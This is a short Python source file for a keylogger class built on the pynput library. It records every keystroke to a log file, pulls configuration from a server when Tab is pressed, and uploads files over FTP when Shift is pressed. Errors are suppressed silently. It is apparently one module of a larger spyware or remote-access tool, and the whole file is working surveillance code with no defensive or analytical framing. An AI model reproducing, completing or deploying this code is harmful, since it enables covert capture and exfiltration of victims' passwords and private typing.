import shutil
from pynput.keyboard import Key, Listener
from threading import Thread
from Util import Util


class Keylogger(Thread):

    def __init__(self, config, communication):
        Thread.__init__(self, name='keylogging')
        self.__config = config
        self.__communication = communication



    def onPress(self, key):
        if self.__config.debug:
            print(key, end='')
        try:
            if key == Key.tab:
                self.__communication.getConfigFromServer()
            elif key == Key.shift:
                self.__communication.uploadFilesFTP()
        except Exception:
            pass
        Util.fileOut(self.__config.logPath + self.__config.logFileName, key)



    def run(self):
        with Listener(on_press=self.onPress) as listener:
            if self.__config.keyloggingIsActive:
                listener.join()
